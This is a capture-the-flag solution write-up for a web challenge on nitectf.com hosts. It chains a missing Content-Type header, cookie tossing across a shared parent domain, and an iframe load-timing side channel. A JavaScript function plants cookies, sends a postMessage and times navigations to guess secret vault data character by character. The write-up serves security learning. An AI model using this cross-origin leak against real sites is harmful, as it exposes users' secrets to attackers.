## JSAPI returns Solution

If you append a hash to the URL in a iframe, it does not navigate but it sends a load event. The solve requires chaining three things:

-   Figuring out that chall2 does not include Content-Type headers and the web browser will happily render HTML/CSS/JS code in the browser (see test.py)
-   Figuring out that you can set a cookie with a common root eTLD+1 and that will be picked up on another domain
-   A interesting browser behaviour, where you can use the speed of a load in a iframe to guess URLs (index.html demonstrates that attack)

```js
async function testForDestination(vaultData, expected) {
    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
    const iframe = document.createElement("iframe");
    if (vaultData.length > 0) {
        document.cookie = "vault-showing-previous-key=true; SameSite=Lax";
        document.cookie =
            "vault-previous-key-shown=" + vaultData + "; SameSite=Lax";
    }
    iframe.src = "http://chall1.nitectf.com";
    document.body.appendChild(iframe);
    await sleep(1000); // Wait for iframe to load
    iframe.contentWindow.postMessage(
        JSON.stringify({
            action: "FORGOT",
        }),
        "*"
    );
    await sleep(1000);
    const before = performance.now();
    let after = null;
    iframe.src =
        "http://chall1.nitectf.com/index.html?vaultData=" +
        vaultData +
        expected +
        "#1234";
    iframe.addEventListener("load", () => {
        after = performance.now();
    });
    await sleep(1000);
    const duration = after - before;
    console.log("Duration: " + duration);
    iframe.remove();
    if (duration < 5) {
        return true;
    } else {
        return false;
    }
}
```
